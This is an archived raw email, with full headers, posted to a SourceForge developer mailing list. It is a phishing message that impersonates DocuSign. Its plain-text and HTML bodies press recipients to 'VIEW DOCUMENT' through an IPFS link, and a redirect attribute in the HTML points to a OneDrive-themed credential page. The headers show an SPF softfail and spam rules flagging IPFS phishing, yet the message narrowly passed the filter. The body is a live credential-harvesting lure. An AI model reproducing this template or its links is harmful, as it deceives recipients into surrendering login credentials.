Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E204B9E9DD1
	for <lists+industrypack-devel@lfdr.de>; Mon,  9 Dec 2024 19:05:08 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tKi82-0005uJ-Qv
	for lists+industrypack-devel@lfdr.de;
	Mon, 09 Dec 2024 18:05:06 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <airimp@net-international.co.jp>) id 1tKi81-0005uB-Mu
 for industrypack-devel@lists.sourceforge.net;
 Mon, 09 Dec 2024 18:05:05 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Rb8t38gnp1pGhh5fumfJIkIGtoVEK5nJDRJWCmiBP0s=; b=mVn92O2js1Ta5CLWhZ/6XOzC4k
 ZI9E0cAjoCPPjywqRO7lPIIevpcOpv7828BFJEDCswMVlj1H/kIH8NT0RIkORzPa1b0jOlijIGeYU
 MKKnFK3GWQzfkEn1nRPAyA5ve/gQ+qo36XA0RnuW38bynSRhOVrfjXxdQMyh8SS/txRo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Rb8t38gnp1pGhh5fumfJIkIGtoVEK5nJDRJWCmiBP0s=; b=M
 XjHqeK+6JVCDHJ99Alzu/cckBfvZrNyoilHqdjuwhRZNj1+dtiaYKgY4F1f3s73Kbz87P32nNSEfU
 jRAwTwxfBzekt+A/YgBkAs73nsfuSsKbbMYwVGMiwbUnVG4pthl25m/wGJCSXOPR2yIXSHl9KMwp0
 EYHLvxT1Jt8OLE3Q=;
Received: from s1042623.srvape.com ([91.184.248.84])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1tKi80-0007ja-2R for industrypack-devel@lists.sourceforge.net;
 Mon, 09 Dec 2024 18:05:05 +0000
Received: from 99RDP (localhost [IPv6:::1])
 by s1042623.srvape.com (Postfix) with ESMTP id B4F7C2CD00D
 for <industrypack-devel@lists.sourceforge.net>;
 Mon,  9 Dec 2024 18:42:58 +0100 (CET)
From: "DocuSign System" <airimp@net-international.co.jp>
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Mon, 9 Dec 2024 09:42:59 -0800
Priority: urgent
X-Priority: 2
Importance: high
Message-Id: <0958202412420979F3549887$22833CB3C0@net-international.co.jp>
X-Spam-Score: 5.7 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: DocuSign Secure Document Received Your Document has been
 completed. VIEW DOCUMENT
 https://ipfs.io/ipfs/QmaMnPzpGRv7fEDKhFjm127CAGewoyN2pZwnLt9rCwyHcU#industrypack-devel@lists.sourceforge.net
 Content analysis details:   (5.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: harjulekter.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [91.184.248.84 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [91.184.248.84 listed in sa-trusted.bondedsender.org]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 1.8 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.8 URI_IPFS               References Interplanetary File System PtP content, 
 probable phishing
X-Headers-End: 1tKi80-0007ja-2R
Subject: [Industrypack-devel] Complete with DocuSign: Pending Documents.pdf
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4621170918503330958=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============4621170918503330958==
Content-Type: multipart/alternative; boundary="H4G6Wb=_kXHixSAucywTrYnfL0gYurfY02"

This is a multi-part message in MIME format

--H4G6Wb=_kXHixSAucywTrYnfL0gYurfY02
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


DocuSign

Secure
Document Received

Your
Document has been completed.
VIEW DOCUMENT https://ipfs.io/ipfs/QmaMnPzpGRv7fEDKhFjm127CAGewoyN2pZw=
nLt9rCwyHcU#industrypack-devel@lists.sourceforge.net

Please
review and and sign. Document can only be viewed by=A0industrypack-dev=
el .
If you are ready to sign please read through the
agreement. All the red boxes are required fields, you will not be able=
 to skip
them, the grey fields are optional but encouraged. =A0Sign-in
authentication with recipient email is required to review and electron=
ically
sign the pending document. There is no requirement for a paper copy to=
 be
produced if completed with DocuSign.

Do Not Share This Email
This email contains a secure link to
DocuSign. Please do not share this email or link with others.About Doc=
uSignSign documents electronically in just minutes.
It's safe, secure, and legally binding. Whether you're in an office, a=
t home,
on-the-go, or even across the globe -- DocuSign provides a professiona=
l trusted
solution for Digital Transaction Management=E2 =A2.Questions about the=

Document?If you need to modify the
document or have questions about the details in the document, please r=
each out
to the sender by emailing them directly.Stop receiving this
emailReport this email=A0or read more
about=A0Declining to sign=A0and=A0Managing notifications.If you are
having trouble signing the document, please visit the=A0Help with
Signing=A0page on our=A0Support Center.

--H4G6Wb=_kXHixSAucywTrYnfL0gYurfY02
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
 <title> Complete with DocuSign: Pending Documents.pdf</title>
</head>
 <body style=3D"MARGIN: 0.5em"> <DIV style=3D"BORDER-LEFT-WIDTH: 0px; =
BOX-SIZING: border-box; FONT-SIZE: 30px; FONT-FAMILY: 'Familjen Grotes=
k', sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHI=
TE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); PADDING-BOTTOM:=
 12px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(244=
,244,244); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-vari=
ant-caps: normal; text-decoration-thickness: initial; text-decoration-=
style: initial; text-decoration-color: initial; -webkit-text-stroke-wi=
dth: 0px; font-stretch: inherit"><SPAN style=3D"BORDER-LEFT-WIDTH: 0px=
; BOX-SIZING: border-box; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0p=
x; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: 70=
0; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">=
DocuSign</SPAN></DIV> <DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING=
: border-box; FONT-SIZE: medium; FONT-FAMILY: inherit; BORDER-RIGHT-WI=
DTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM=
-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALI=
GN: left; PADDING-TOP: 15px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: =
2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-W=
IDTH: 0px; BACKGROUND-COLOR: rgb(0,86,179); TEXT-INDENT: 0px; font-var=
iant-ligatures: normal; font-variant-caps: normal; text-decoration-thi=
ckness: initial; text-decoration-style: initial; text-decoration-color=
: initial; -webkit-text-stroke-width: 0px; font-stretch: inherit; font=
-size-adjust: inherit"> <DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZI=
NG: border-box; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans=
-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTT=
OM-WIDTH: 0px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIG=
N: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-R=
IGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">Secure Docume=
nt Received</DIV> <DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: bo=
rder-box; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif=
; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WID=
TH: 0px; PADDING-BOTTOM: 22px; TEXT-ALIGN: center; PADDING-TOP: 22px; =
PADDING-LEFT: 22px; MARGIN: 0px; PADDING-RIGHT: 22px; BORDER-TOP-WIDTH=
: 0px; BACKGROUND-COLOR: rgb(244,244,244); font-stretch: inherit"><SPA=
N style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY=
: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
OTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TO=
P-WIDTH: 0px; font-stretch: inherit; font-size-adjust: inherit"><STRON=
G>Your Document has been completed.</STRONG><BR style=3D"BOX-SIZING: b=
order-box"><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZIN=
G: border-box"></SPAN><SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZIN=
G: border-box; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL=
-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(255,255,255); P=
ADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(215,1=
50,22); font-stretch: inherit; font-size-adjust: inherit"><B style=3D"=
BOX-SIZING: border-box; FONT-WEIGHT: bolder"><A id=3Dm_455577063923932=
9815v1OWA03882727-91dc-041f-1ab6-349bb50a5363 style=3D"BORDER-LEFT-WID=
TH: 0px; BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: i=
nherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTT=
OM-WIDTH: 0px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; TEXT-ALI=
GN: center; PADDING-TOP: 12px; PADDING-LEFT: 22px; MARGIN: 22px 0px; P=
ADDING-RIGHT: 22px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(215,1=
50,22); font-stretch: inherit; font-size-adjust: inherit" href=3D"http=
s://ipfs.io/ipfs/QmaMnPzpGRv7fEDKhFjm127CAGewoyN2pZwnLt9rCwyHcU#indust=
rypack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank d=
ata-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://harjulek=
ter.com/Onedrivesjldofl/drivinghspeed/opemeipoklp/OneDrive/?id%3D%23sh=
elley@furuipharma.com&amp;source=3Dgmail&amp;ust=3D1723900144597000&am=
p;usg=3DAOvVaw3XmH1grj29vGIYrAtUooP-" data-saferedirectreason=3D"2">VI=
EW DOCUMENT</A></B></SPAN></DIV> <DIV style=3D"BORDER-LEFT-WIDTH: 0px;=
 BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Helvetica, Aria=
l, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-A=
LIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); PADDIN=
G-BOTTOM: 40px; TEXT-ALIGN: left; PADDING-TOP: 40px; PADDING-LEFT: 0px=
; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-C=
OLOR: white; font-stretch: inherit"><SPAN style=3D"BORDER-LEFT-WIDTH: =
0px; BOX-SIZING: border-box; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH:=
 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTT=
OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT=
: 20px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inher=
it">Please review and and sign. Document can only be viewed by<SPAN st=
yle=3D"BOX-SIZING: border-box">&nbsp;industrypack-devel</SPAN></SPAN> =
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FA=
MILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORD=
ER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px; BORDER-T=
OP-WIDTH: 0px; font-stretch: inherit">.<BR><BR style=3D"BOX-SIZING: bo=
rder-box">If you are ready to sign please read through the agreement. =
All the red boxes are required fields, you will not be able to skip th=
em, the grey fields are optional but encouraged. &nbsp;<BR style=3D"BO=
X-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">Sign-in aut=
hentication with recipient email is required to review and electronica=
lly sign the pending document. There is no requirement for a paper cop=
y to be produced if completed with DocuSign.</SPAN></DIV> <DIV style=3D=
"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: inherit;=
 BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDT=
H: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; MA=
RGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR=
: rgb(244,244,244); font-stretch: inherit; font-size-adjust: inherit">=
 <DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SI=
ZE: 13px; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif=
; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WID=
TH: 0px; COLOR: rgb(136,136,136); PADDING-BOTTOM: 0px; TEXT-ALIGN: cen=
ter; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit"><B style=3D"BOX-SIZ=
ING: border-box; FONT-WEIGHT: bolder">Do Not Share This Email</B> <BR =
style=3D"BOX-SIZING: border-box">This email contains a secure link to =
DocuSign. Please do not share this email or link with others.<BR style=
=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><B st=
yle=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">About DocuSign</B>=
<BR style=3D"BOX-SIZING: border-box">Sign documents electronically in =
just minutes. It's safe, secure, and legally binding. Whether you're i=
n an office, at home, on-the-go, or even across the globe -- DocuSign =
provides a professional trusted solution for Digital Transaction Manag=
ement=E2 =A2.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZ=
ING: border-box"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold=
er">Questions about the Document?</B><BR style=3D"BOX-SIZING: border-b=
ox">If you need to modify the document or have questions about the det=
ails in the document, please reach out to the sender by emailing them =
directly.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING:=
 border-box"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">=
Stop receiving this email</B><BR style=3D"BOX-SIZING: border-box">Repo=
rt this email&nbsp;or read more about&nbsp;Declining to sign&nbsp;and&=
nbsp;Managing notifications.<BR style=3D"BOX-SIZING: border-box"><BR s=
tyle=3D"BOX-SIZING: border-box">If you are having trouble signing the =
document, please visit the&nbsp;Help with Signing&nbsp;page on our&nbs=
p;Support Center.</DIV></DIV></DIV></body>
</html>

--H4G6Wb=_kXHixSAucywTrYnfL0gYurfY02--



--===============4621170918503330958==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4621170918503330958==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4621170918503330958==--


